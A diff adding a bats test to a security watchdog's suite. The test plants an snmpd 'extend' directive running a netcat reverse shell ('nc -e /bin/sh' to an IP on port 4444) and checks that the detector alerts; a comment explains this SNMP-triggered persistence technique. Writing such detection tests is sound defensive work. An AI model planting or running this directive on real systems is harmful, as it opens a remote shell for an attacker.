@@ -243,3 +243,18 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
         bash "${WD}"
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in snmpd extend directive: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
+    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
+    # dhcpcd-hooks/display-manager-hooks/dnf-plugins/fail2ban-action/
+    # grub-config/initramfs-hooks/kernel-install-hooks/motd-scripts/
+    # needrestart-hooks/pm-utils-hooks/resolvconf-hooks/skel
+    # nc reverse-shell variant INVARIANTs across the brain. Lock the
+    # netcat axis on the snmpd-OID-trigger remote-exec persistence
+    # surface (T1546/T1059 — SNMP GET to planted OID makes snmpd run
+    # the directive program remotely).
+    printf 'extend evilcheck /bin/sh -c "nc -e /bin/sh 1.1.1.1 4444"\n' > "${CONF}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
